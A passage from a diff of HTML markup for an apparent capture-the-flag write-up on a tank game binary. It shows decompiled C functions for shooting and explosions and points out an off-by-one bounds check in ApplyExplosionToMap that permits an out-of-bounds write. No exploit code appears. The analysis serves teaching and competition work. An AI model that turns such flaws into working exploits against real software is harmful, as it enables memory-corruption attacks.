+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>		ix <span style="color:#ff79c6">=</span> x_1;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>		iy <span style="color:#ff79c6">=</span> y_1;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>		<span style="color:#6272a4">/* ... */</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>	}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>	<span style="color:#ff79c6">if</span> ( explode )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>	{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>		a2.x <span style="color:#ff79c6">=</span> ix;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>		a2.y <span style="color:#ff79c6">=</span> iy;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>		a2.weapon <span style="color:#ff79c6">=</span> Target<span style="color:#ff79c6">-&gt;</span>Weapon;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>		bullet_event_emplace_back(bullet, <span style="color:#ff79c6">&amp;</span>a2);
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>		ApplyExplosionToMap(map, ix, iy, Target<span style="color:#ff79c6">-&gt;</span>Weapon);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>	}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span>	LOBYTE(v5) <span style="color:#ff79c6">=</span> explode;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span>	<span style="color:#ff79c6">return</span> v5 <span style="color:#ff79c6">|</span> (ix <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">32</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span>}
+</code></pre></div><p>This function is responsible for projectile shooting of <strong>Green Tank</strong>. The trajectory of bullet is effected by <strong>Gravity</strong> (line 23), <strong>Angle</strong> and <strong>Power</strong> (line 11-12). After calculating the correct coordinate of the Explosion, the explosion effect is applied to the <strong>MAP</strong> (line 34).</p>
 <h1 id="2-firetankgunandcheathard">2. FireTankGunAndCheatHard</h1>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">Explosion <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">FireTankGunAndCheatHard</span>(
-	<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>MAP,
-	Bullet <span style="color:#ff79c6">*</span>bullet_event,
-	<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> weapon,
-	<span style="color:#8be9fd">int</span> a4, <span style="color:#8be9fd">int</span> a5, <span style="color:#8be9fd">int</span> a6
-)
-{
-
-	<span style="color:#6272a4">/* ... */</span>
-	bullet_event_clear(bullet_event);
-	v17 <span style="color:#ff79c6">=</span> v7;
-	y_1 <span style="color:#ff79c6">=</span> v8 <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">5.0</span>;
-	explode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
-	<span style="color:#ff79c6">while</span> ( y_1 <span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">20.0</span> )
-	{
-		x <span style="color:#ff79c6">=</span> v17;
-		y <span style="color:#ff79c6">=</span> y_1;
-		<span style="color:#ff79c6">if</span> ( y_1 <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> GetPixel(MAP, x, y) )
-		{
-			explode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
-			<span style="color:#ff79c6">break</span>;
-		}
-		v14.x <span style="color:#ff79c6">=</span> x;
-		v14.y <span style="color:#ff79c6">=</span> y;
-		v14.weapon <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
-		bullet_event_emplace_back(bullet_event, <span style="color:#ff79c6">&amp;</span>v14);
-		y_1 <span style="color:#ff79c6">=</span> y_1 <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1.5</span>;
-	}
-	<span style="color:#6272a4">/* ... */</span>
-	<span style="color:#ff79c6">if</span> ( explode )
-	{
-		x_1.x <span style="color:#ff79c6">=</span> x;
-		x_1.y <span style="color:#ff79c6">=</span> y;
-		x_1.weapon <span style="color:#ff79c6">=</span> weapon;
-		bullet_event_emplace_back(bullet_event, <span style="color:#ff79c6">&amp;</span>x_1);
-<span style="display:block;width:100%;background-color:#3d3f4a">		ApplyExplosionToMap(MAP, x, y, weapon);
-</span>	}
-	LOBYTE(v6) <span style="color:#ff79c6">=</span> explode;
-	<span style="color:#ff79c6">*&amp;</span>v12.exploded <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">|</span> (x <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">32</span>);
-	<span style="color:#ff79c6">*&amp;</span>v12.y <span style="color:#ff79c6">=</span> y <span style="color:#ff79c6">|</span> (weapon <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">32</span>);
-	<span style="color:#ff79c6">return</span> v12;
-}
-</code></pre></td></tr></table>
-</div>
-</div><p>This function is responsible for <strong>NON-PROJECTILE AIMBOT</strong> shooting of <strong>Red Tank</strong>. The trajectory of bullet shot by <strong>Red Tank</strong> is always fixed on <strong>Green Tank</strong>. The Bullet never misses because it falls straight on <strong>Green Tank</strong>. After calculating the correct coordinate of the Explosion, the explosion effect is applied to the <strong>MAP</strong> (line 36).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>Explosion <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">FireTankGunAndCheatHard</span>(
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>	<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>MAP,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>	Bullet <span style="color:#ff79c6">*</span>bullet_event,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>	<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> weapon,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>	<span style="color:#8be9fd">int</span> a4, <span style="color:#8be9fd">int</span> a5, <span style="color:#8be9fd">int</span> a6
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>	<span style="color:#6272a4">/* ... */</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>	bullet_event_clear(bullet_event);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>	v17 <span style="color:#ff79c6">=</span> v7;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>	y_1 <span style="color:#ff79c6">=</span> v8 <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">5.0</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>	explode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>	<span style="color:#ff79c6">while</span> ( y_1 <span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">20.0</span> )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>	{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>		x <span style="color:#ff79c6">=</span> v17;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>		y <span style="color:#ff79c6">=</span> y_1;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>		<span style="color:#ff79c6">if</span> ( y_1 <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> GetPixel(MAP, x, y) )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>		{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>			explode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>			<span style="color:#ff79c6">break</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>		}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>		v14.x <span style="color:#ff79c6">=</span> x;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>		v14.y <span style="color:#ff79c6">=</span> y;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>		v14.weapon <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>		bullet_event_emplace_back(bullet_event, <span style="color:#ff79c6">&amp;</span>v14);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>		y_1 <span style="color:#ff79c6">=</span> y_1 <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1.5</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>	}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>	<span style="color:#6272a4">/* ... */</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>	<span style="color:#ff79c6">if</span> ( explode )
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>	{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>		x_1.x <span style="color:#ff79c6">=</span> x;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>		x_1.y <span style="color:#ff79c6">=</span> y;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>		x_1.weapon <span style="color:#ff79c6">=</span> weapon;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>		bullet_event_emplace_back(bullet_event, <span style="color:#ff79c6">&amp;</span>x_1);
+<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span>		ApplyExplosionToMap(MAP, x, y, weapon);
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span>	}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span>	LOBYTE(v6) <span style="color:#ff79c6">=</span> explode;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span>	<span style="color:#ff79c6">*&amp;</span>v12.exploded <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">|</span> (x <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">32</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span>	<span style="color:#ff79c6">*&amp;</span>v12.y <span style="color:#ff79c6">=</span> y <span style="color:#ff79c6">|</span> (weapon <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">32</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span>	<span style="color:#ff79c6">return</span> v12;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span>}
+</code></pre></div><p>This function is responsible for <strong>NON-PROJECTILE AIMBOT</strong> shooting of <strong>Red Tank</strong>. The trajectory of bullet shot by <strong>Red Tank</strong> is always fixed on <strong>Green Tank</strong>. The Bullet never misses because it falls straight on <strong>Green Tank</strong>. After calculating the correct coordinate of the Explosion, the explosion effect is applied to the <strong>MAP</strong> (line 36).</p>
 <p>Looking at the above functions we know that the <strong>Red Tank</strong> is going to punish us if we miss any of our shots.</p>
 <h3 id="the-vulnerability">The Vulnerability</h3>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">ApplyExplosionToMap</span>(
-	<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>map,
-	<span style="color:#8be9fd">int</span> x,
-	<span style="color:#8be9fd">int</span> y,
-	<span style="color:#8be9fd">int</span> weapon
-)
-{
-	<span style="color:#8be9fd">bool</span> effect; <span style="color:#6272a4">// [rsp+2Ch] [rbp-1Ch]
-</span><span style="color:#6272a4"></span>	<span style="color:#8be9fd">int</span> r; <span style="color:#6272a4">// [rsp+34h] [rbp-14h]
-</span><span style="color:#6272a4"></span>	<span style="color:#8be9fd">signed</span> <span style="color:#8be9fd">int</span> j; <span style="color:#6272a4">// [rsp+38h] [rbp-10h]
-</span><span style="color:#6272a4"></span>	<span style="color:#8be9fd">signed</span> <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+3Ch] [rbp-Ch]
-</span><span style="color:#6272a4"></span>
-	r <span style="color:#ff79c6">=</span> WEAPON_EXPLOSION_RADIUS[weapon];
-	effect <span style="color:#ff79c6">=</span> weapon <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">2</span>;
-
-	<span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> y <span style="color:#ff79c6">-</span> r; y <span style="color:#ff79c6">+</span> r <span style="color:#ff79c6">&gt;=</span> i; <span style="color:#ff79c6">++</span>i )
-	{
-		<span style="color:#ff79c6">for</span> ( j <span style="color:#ff79c6">=</span> x <span style="color:#ff79c6">-</span> r; x <span style="color:#ff79c6">+</span> r <span style="color:#ff79c6">&gt;=</span> j; <span style="color:#ff79c6">++</span>j )
-		{
-<span style="display:block;width:100%;background-color:#3d3f4a">			<span style="color:#ff79c6">if</span> ( (i <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> i <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">480</span>) <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#6272a4">// Vulnerability
-</span></span><span style="color:#6272a4"></span>				 (j <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> j <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">639</span>) <span style="color:#ff79c6">&amp;&amp;</span>
-				 ((j <span style="color:#ff79c6">-</span> x) <span style="color:#ff79c6">*</span> (j <span style="color:#ff79c6">-</span> x) <span style="color:#ff79c6">+</span> (i <span style="color:#ff79c6">-</span> y) <span style="color:#ff79c6">*</span> (i <span style="color:#ff79c6">-</span> y) <span style="color:#ff79c6">&lt;=</span> r <span style="color:#ff79c6">*</span> r )
-			   ){
-<span style="display:block;width:100%;background-color:#3d3f4a">				PutPixel(map, j, i, effect);
-</span>			}
-		}
-	}
-	<span style="color:#ff79c6">return</span> ApplyGravitationToMap(map, (x <span style="color:#ff79c6">-</span> r), (r <span style="color:#ff79c6">+</span> x));
-}
-
-<span style="color:#6272a4">/* Modifies Colors in MAP at bit level */</span>
-<span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">PutPixel</span>(
-	<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>MAP,
-	<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> x,
-	<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> y,
-	<span style="color:#8be9fd">char</span> color
-)
-{
-	<span style="color:#ff79c6">__int64</span> result; <span style="color:#6272a4">// rax
-</span><span style="color:#6272a4"></span>	<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> v5; <span style="color:#6272a4">// [rsp+20h] [rbp-4h]
-</span><span style="color:#6272a4"></span>
-	<span style="color:#ff79c6">if</span> ( x <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">639</span> <span style="color:#ff79c6">&amp;&amp;</span> y <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">480</span> )
-	{
-		v5 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">640</span> <span style="color:#ff79c6">*</span> y <span style="color:#ff79c6">+</span> x;
-		MAP[v5 <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">&amp;=</span> <span style="color:#ff79c6">~</span>(<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> (v5 <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">7</span>));
-		result <span style="color:#ff79c6">=</span> MAP[v5 <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">3</span>];
-		LOBYTE(result) <span style="color:#ff79c6">=</span> ((color <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">&lt;&lt;</span> (v5 <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">7</span>)) <span style="color:#ff79c6">|</span> result;
-		MAP[v5 <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">=</span> result;
-	}
-	<span style="color:#ff79c6">return</span> result;
-}
-</code></pre></td></tr></table>
-</div>
-</div><p>Did you spot the Vulnerability?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">ApplyExplosionToMap</span>(
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>	<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>map,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>	<span style="color:#8be9fd">int</span> x,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>	<span style="color:#8be9fd">int</span> y,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>	<span style="color:#8be9fd">int</span> weapon
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>{
